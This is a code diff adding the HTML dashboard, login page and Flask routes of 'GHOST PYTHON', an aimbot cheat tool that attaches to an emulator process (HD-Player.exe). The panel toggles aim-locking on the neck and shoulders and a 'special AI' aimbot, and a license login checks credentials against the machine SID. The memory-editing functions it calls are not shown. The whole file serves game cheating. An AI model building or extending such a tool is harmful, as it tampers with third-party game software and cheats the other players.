+            letter-spacing: 1px;
+        }
+
+        hr {
+            border: none;
+            border-top: 1px solid #2a2a2a;
+            margin: 15px 0;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .toggle-group {
+            display: flex;
+            gap: 8px;
+        }
+
+        .toggle-btn {
+            padding: 5px 14px;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 20px;
+            color: #888;
+            font-size: 11px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            letter-spacing: 1px;
+        }
+
+        .toggle-btn.active {
+            background: #ff2929;
+            border-color: #ff2929;
+            color: white;
+            box-shadow: 0 0 8px rgba(255, 41, 41, 0.4);
+        }
+
+        .toggle-btn:hover {
+            background: #2a2a2a;
+        }
+
+        .legit-settings {
+            background-color: #1a1a2a;
+            border-radius: 8px;
+            padding: 12px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header-card">
+            <h1>GHOST PYTHON</h1>
+            <p>STEALTH • PRECISION • SPEED</p>
+            <div class="status-badge" id="statusBadge">CHECKING</div>
+            <div class="current-process-text" id="currentProcessText">TARGET: HD-PLAYER.EXE</div>
+        </div>
+
+        <div class="process-section hidden" id="process-section">
+            <h3>OFFLINE - SELECT TARGET</h3>
+            <div class="process-row">
+                <select id="process-selector">
+                    <option value="">SELECT PROCESS</option>
+                </select>
+                <div class="btn" onclick="refreshProcessList()">REFRESH</div>
+                <div class="btn btn-primary" onclick="setTargetProcess()">SET</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>AIMBOT SYSTEM</h2>
+            </div>
+            <div class="card-body">
+                <div style="margin-bottom: 20px;">
+                    <div class="btn btn-primary" style="width: 100%; text-align: center; padding: 10px;" onclick="scanPlayers()">SCAN ENTITIES</div>
+                </div>
+
+                <div class="aimbot-panel">
+                    <div class="aimbot-title">NECK</div>
+                    <div class="button-group">
+                        <div class="btn btn-aimbot" id="neckEnableBtn" onclick="enableNeck()">ENABLE</div>
+                        <div class="btn btn-aimbot active" id="neckDisableBtn" onclick="disableNeck()">DISABLE</div>
+                    </div>
+                </div>
+
+                <div class="aimbot-panel">
+                    <div class="aimbot-title">LEFT SHOULDER</div>
+                    <div class="button-group">
+                        <div class="btn btn-aimbot" id="leftEnableBtn" onclick="enableLeft()">ENABLE</div>
+                        <div class="btn btn-aimbot active" id="leftDisableBtn" onclick="disableLeft()">DISABLE</div>
+                    </div>
+                </div>
+
+                <div class="aimbot-panel">
+                    <div class="aimbot-title">RIGHT SHOULDER</div>
+                    <div class="button-group">
+                        <div class="btn btn-aimbot" id="rightEnableBtn" onclick="enableRight()">ENABLE</div>
+                        <div class="btn btn-aimbot active" id="rightDisableBtn" onclick="disableRight()">DISABLE</div>
+                    </div>
+                </div>
+
+                <hr>
+
+                <div class="aimbot-panel">
+                    <div class="aimbot-title">SPECIAL AIMBOT</div>
+                    <div class="button-group">
+                        <div class="btn btn-aimbot" id="aiEnableBtn" onclick="enableAi()">ENABLE</div>
+                        <div class="btn btn-aimbot active" id="aiDisableBtn" onclick="disableAi()">DISABLE</div>
+                    </div>
+                </div>
+
+                <div class="settings-row" style="margin-top: 15px;">
+                    <span class="settings-label">IGNORE KNOCKED</span>
+                    <div class="toggle-group">
+                        <div class="toggle-btn active" id="ignoreYesBtn" onclick="setIgnoreKnocked(true)">YES</div>
+                        <div class="toggle-btn" id="ignoreNoBtn" onclick="setIgnoreKnocked(false)">NO</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>SETTINGS</h2>
+            </div>
+            <div class="card-body">
+                <div class="settings-row">
+                    <span class="settings-label">HOLD KEY</span>
+                    <select id="hold-hotkey-selector">
+                        <option value="">NONE</option>
+                        <optgroup label="KEYS">
+                            <option value="X">X</option><option value="C">C</option><option value="V">V</option>
+                            <option value="F">F</option><option value="MouseLeft">MOUSE LEFT</option>
+                            <option value="MouseRight">MOUSE RIGHT</option>
+                            <option value="MouseMiddle">MOUSE MIDDLE</option>
+                        </optgroup>
+                    </select>
+                </div>
+
+                <div class="settings-row">
+                    <span class="settings-label">HOLD DELAY (MS)</span>
+                    <input type="range" min="0" max="300" value="50" id="delaySlider" style="width: 200px;">
+                    <span id="delayValue">50ms</span>
+                </div>
+
+                <hr>
+
+                <div class="settings-row">
+                    <span class="settings-label">LOGOUT</span>
+                    <div class="btn" onclick="logout()" style="padding: 5px 16px;">LOGOUT</div>
+                </div>
+
+                <div class="settings-row">
+                    <span class="settings-label">EXIT</span>
+                    <div class="btn btn-danger" onclick="exitApp()" style="padding: 5px 16px;">EXIT</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>CONSOLE</h2>
+            </div>
+            <div class="card-body">
+                <div class="console" id="console">[SYSTEM] READY</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const consoleEl = document.getElementById('console');
+        const holdHotkeySelector = document.getElementById('hold-hotkey-selector');
+        const delaySlider = document.getElementById('delaySlider');
+        const delayValueSpan = document.getElementById('delayValue');
+
+        function log(message) {
+            const now = new Date();
+            const time = now.toLocaleTimeString();
+            if (consoleEl.textContent.length > 0 && !consoleEl.textContent.endsWith('\\n')) {
+                consoleEl.textContent += '\\n';
+            }
+            consoleEl.textContent += `[${time}] ${message}`;
+            consoleEl.scrollTop = consoleEl.scrollHeight;
+            if (consoleEl.textContent.length > 5000) {
+                consoleEl.textContent = consoleEl.textContent.slice(-4000);
+            }
+        }
+
+        function updateButtonState(enableId, disableId, isEnabled) {
+            const enableBtn = document.getElementById(enableId);
+            const disableBtn = document.getElementById(disableId);
+            if (isEnabled) {
+                enableBtn.classList.add('active');
+                disableBtn.classList.remove('active');
+            } else {
+                enableBtn.classList.remove('active');
+                disableBtn.classList.add('active');
+            }
+        }
+
+        function scanPlayers() {
+            log('SCANNING FOR ENTITIES');
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'aimbotscan' })
+            })
+            .then(r => r.json())
+            .then(d => { if (d.message) log(d.message); })
+            .catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function enableNeck() {
+            log('NECK ENABLED');
+            updateButtonState('neckEnableBtn', 'neckDisableBtn', true);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'aimbotenable' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function disableNeck() {
+            log('NECK DISABLED');
+            updateButtonState('neckEnableBtn', 'neckDisableBtn', false);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'aimbotdisable' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function enableLeft() {
+            log('LEFT SHOULDER ENABLED');
+            updateButtonState('leftEnableBtn', 'leftDisableBtn', true);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'leftShoulderOn' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function disableLeft() {
+            log('LEFT SHOULDER DISABLED');
+            updateButtonState('leftEnableBtn', 'leftDisableBtn', false);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'leftShoulderOff' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function enableRight() {
+            log('RIGHT SHOULDER ENABLED');
+            updateButtonState('rightEnableBtn', 'rightDisableBtn', true);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'rightShoulderOn' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function disableRight() {
+            log('RIGHT SHOULDER DISABLED');
+            updateButtonState('rightEnableBtn', 'rightDisableBtn', false);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'rightShoulderOff' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function enableAi() {
+            log('AIMBOT AI ENABLED');
+            updateButtonState('aiEnableBtn', 'aiDisableBtn', true);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'AimbotAion' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function disableAi() {
+            log('AIMBOT AI DISABLED');
+            updateButtonState('aiEnableBtn', 'aiDisableBtn', false);
+            fetch('/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ command: 'AimbotAioff' })
+            }).catch(e => log(`ERROR: ${e.message}`));
+        }
+
+        function setIgnoreKnocked(ignore) {
+            fetch('/set_ignore_knocked', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ ignore_knocked: ignore })
+            });
+            log(`IGNORE KNOCKED: ${ignore ? 'YES' : 'NO'}`);
+            if (ignore) {
+                document.getElementById('ignoreYesBtn').classList.add('active');
+                document.getElementById('ignoreNoBtn').classList.remove('active');
+            } else {
+                document.getElementById('ignoreYesBtn').classList.remove('active');
+                document.getElementById('ignoreNoBtn').classList.add('active');
+            }
+        }
+
+        function logout() {
+            fetch('/logout', { method: 'POST' }).then(() => window.location.href = '/');
+        }
+
+        function exitApp() {
+            if (confirm('EXIT GHOST PYTHON?')) {
+                fetch('/exit', { method: 'POST' });
+                log('SYSTEM SHUTDOWN');
+                setTimeout(() => window.close(), 1500);
+            }
+        }
+
+        function saveHoldHotkey(key) {
+            fetch('/save_hold_hotkey', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ hotkey: key })
+            });
+        }
+
+        function saveHoldDelay(delay) {
+            fetch('/save_hold_delay', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ delay: delay })
+            });
+        }
+
+        function refreshProcessList() {
+            fetch('/get_processes')
+                .then(r => r.json())
+                .then(data => {
+                    const selector = document.getElementById('process-selector');
+                    if (selector && data.success) {
+                        selector.innerHTML = '<option value="">SELECT PROCESS</option>';
+                        data.processes.forEach(p => {
+                            const opt = document.createElement('option');
+                            opt.value = p.name;
+                            opt.textContent = `${p.name} (PID: ${p.pid})`;
+                            selector.appendChild(opt);
+                        });
+                        log('PROCESS LIST UPDATED');
+                    }
+                });
+        }
+
+        function setTargetProcess() {
+            const selector = document.getElementById('process-selector');
+            const selected = selector.value;
+            if (!selected) { log('SELECT A PROCESS FIRST'); return; }
+            fetch('/set_target_process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ process_name: selected })
+            })
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    log(`TARGET SET: ${selected}`);
+                    document.getElementById('currentProcessText').textContent = `TARGET: ${selected.toUpperCase()}`;
+                    updateStatus();
+                }
+            });
+        }
+
+        function updateStatus() {
+            fetch('/get_hd_player_status')
+                .then(r => r.json())
+                .then(data => {
+                    const badge = document.getElementById('statusBadge');
+                    const processSection = document.getElementById('process-section');
+                    if (data.is_running) {
+                        badge.textContent = 'ONLINE';
+                        badge.className = 'status-badge online';
+                        processSection.classList.add('hidden');
+                    } else {
+                        badge.textContent = 'OFFLINE';
+                        badge.className = 'status-badge offline';
+                        processSection.classList.remove('hidden');
+                    }
+                    document.getElementById('currentProcessText').textContent = `TARGET: ${data.current_process.toUpperCase()}`;
+                });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            updateStatus();
+            setInterval(updateStatus, 3000);
+            refreshProcessList();
+
+            fetch('/get_hold_hotkey').then(r => r.json()).then(d => {
+                if (d.success && d.hotkey) holdHotkeySelector.value = d.hotkey;
+            });
+
+            holdHotkeySelector.addEventListener('change', () => {
+                const key = holdHotkeySelector.value;
+                saveHoldHotkey(key);
+                log(`HOLD KEY: ${key || 'NONE'}`);
+            });
+
+            delaySlider.addEventListener('input', (e) => {
+                delayValueSpan.textContent = e.target.value + 'ms';
+                saveHoldDelay(parseInt(e.target.value));
+            });
+            delaySlider.addEventListener('change', (e) => {
+                log(`HOLD DELAY: ${e.target.value}ms`);
+            });
+
+            log('GHOST PYTHON ACTIVE');
+        });
+    </script>
+</body>
+</html>"""
+
+LOGIN_HTML = """<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>GHOST PYTHON - LOGIN</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #0f0f0f;
+            font-family: 'Segoe UI', sans-serif;
+            color: #fff;
+            overflow: hidden;
+        }
+        .container {
+            display: flex;
+            height: 100vh;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+        .login-box {
+            background: #1b1b1b;
+            border: 1px solid #ff2929;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0 0 25px rgba(255, 41, 41, 0.4);
+            width: 360px;
+        }
+        .login-box h2 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #ff2929;
+            letter-spacing: 2px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 12px;
+            color: #ccc;
+            letter-spacing: 1px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: #0f0f0f;
+            border: 1px solid #30363d;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #ff2929;
+        }
+        .btn {
+            width: 100%;
+            background: #ff2929;
+            color: #000;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+            letter-spacing: 1px;
+        }
+        .btn:hover {
+            background: #ff5555;
+        }
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: #dc3545;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 8px;
+            display: none;
+            z-index: 9999;
+            font-weight: bold;
+        }
+        #particles-js {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 15, 15, 0.95);
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+        }
+        .loader-ring {
+            border: 5px solid rgba(255, 41, 41, 0.2);
+            border-top: 5px solid #ff2929;
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            animation: spin 1s linear infinite;
+        }
+        .loader-text {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #ff2929;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loader-ring"></div>
+        <div class="loader-text">VERIFYING</div>
+    </div>
+    <div class="container">
+        <div class="login-box">
+            <h2>GHOST PYTHON</h2>
+            <form method="POST" action="/" onsubmit="showLoading()">
+                <div class="form-group">
+                    <label>USERNAME</label>
+                    <input name="username" type="text" id="username" required autocomplete="off">
+                </div>
+                <div class="form-group">
+                    <label>PASSWORD</label>
+                    <input name="password" type="password" id="password" required>
+                </div>
+                <button class="btn" type="submit">LOGIN</button>
+            </form>
+            {% if error %}
+                <div class="notification" style="display:block; position:relative; margin-top:15px;">{{ error }}</div>
+            {% endif %}
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+    <script>
+        particlesJS("particles-js", {
+            "particles": {
+                "number": { "value": 80 },
+                "color": { "value": "#ff2929" },
+                "shape": { "type": "circle" },
+                "opacity": { "value": 0.5 },
+                "size": { "value": 3 },
+                "move": { "enable": true, "speed": 5 }
+            },
+            "interactivity": {
+                "events": { "onhover": { "enable": true, "mode": "repulse" } }
+            }
+        });
+        function showLoading() { document.getElementById("loadingOverlay").style.display = "flex"; }
+    </script>
+</body>
+</html>"""
+
+# ==================== FLASK ROUTES ====================
+@app.route('/', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        username = request.form.get('username')
+        password = request.form.get('password')
+        
+        creds = fetch_credentials()
+        sid = get_computer_sid()
+        
+        if username in creds and creds[username][0] == password and creds[username][1] == sid:
+            session['logged_in'] = True
+            session['username'] = username
+            return redirect(url_for('dashboard'))
+        else:
+            return render_template_string(LOGIN_HTML, error="INVALID CREDENTIALS OR SID MISMATCH")
+    
+    return render_template_string(LOGIN_HTML)
+
+@app.route('/dashboard')
+def dashboard():
+    if not session.get('logged_in'):
+        return redirect(url_for('login'))
+    return render_template_string(INDEX_HTML)
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('login'))
+
+@app.route('/execute', methods=['POST'])
+def execute_command():
+    if not session.get('logged_in'):
+        return jsonify({"success": False, "message": "Not logged in"}), 401
+    
+    data = request.get_json()
+    command = data.get('command')
+    
+    result = "Unknown command"
+    
+    if command == "aimbotscan":
+        result = HEADLOAD()
+    elif command == "aimbotenable":
+        result = HEADON()
+    elif command == "aimbotdisable":
+        result = AIMBOT_OFF()
+    elif command == "leftShoulderOn":
+        result = LEFTSHOULDERON()
+    elif command == "leftShoulderOff":
+        result = LEFTSHOULDEROFF()
+    elif command == "rightShoulderOn":
+        result = RIGHTSHOULDERON()
+    elif command == "rightShoulderOff":
+        result = RIGHTSHOULDEROFF()
+    elif command == "AimbotAion":
+        result = AIMBOTAI_ON()
+    elif command == "AimbotAioff":
+        result = AIMBOTAIOFF()
+    
+    return jsonify({"success": True, "message": result})
+
+@app.route('/save_hold_hotkey', methods=['POST'])
+def save_hold_hotkey_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    data = request.get_json()
+    hotkey_state["hold_key"] = data.get('hotkey', '') or None
+    return jsonify({"success": True})
+
+@app.route('/save_hold_delay', methods=['POST'])
+def save_hold_delay_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    data = request.get_json()
+    hotkey_state["delay"] = data.get('delay', 50)
+    return jsonify({"success": True})
+
+@app.route('/get_hold_hotkey', methods=['GET'])
+def get_hold_hotkey_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    return jsonify({"success": True, "hotkey": hotkey_state["hold_key"] or ''})
+
+@app.route('/set_ignore_knocked', methods=['POST'])
+def set_ignore_knocked_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    data = request.get_json()
+    user_settings['ignore_knocked'] = data.get('ignore_knocked', True)
+    return jsonify({"success": True})
+
+@app.route('/get_hd_player_status', methods=['GET'])
+def get_hd_player_status_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    return jsonify({"is_running": is_target_process_running(), "current_process": current_process_name})
+
+@app.route('/get_processes', methods=['GET'])
+def get_processes_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    return jsonify({"success": True, "processes": get_running_processes()})
+
+@app.route('/set_target_process', methods=['POST'])
+def set_target_process_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    data = request.get_json()
+    process_name = data.get('process_name')
+    if process_name and set_target_process(process_name):
+        return jsonify({"success": True})
+    return jsonify({"success": False})
+
+@app.route('/exit', methods=['POST'])
+def exit_route():
+    if not session.get('logged_in'):
+        return jsonify({"success": False}), 401
+    threading.Thread(target=lambda: (time.sleep(1), exit_application()), daemon=True).start()
+    return jsonify({"success": True})
+
+# ==================== MAIN ====================
+if __name__ == '__main__':
+    print("=" * 50)
+    print("GHOST PYTHON")
+    print("=" * 50)
+    print(f"Server running on: http://localhost:{SERVER_PORT}")
+    print(f"Target Process: {current_process_name}")
+    print("=" * 50)
+    print("Press Ctrl+C to exit")
+    print("=" * 50)
+    
+    threading.Thread(target=hold_hotkey_monitor, daemon=True).start()
+    threading.Thread(target=match_status_monitor, daemon=True).start()
+    
+    try:
+        app.run(host='0.0.0.0', port=SERVER_PORT, debug=False, use_reloader=False)
+    except KeyboardInterrupt:
+        print("\n[+] Shutting down...")
+        AIMBOT_OFF()
+        print("[+] Goodbye!")
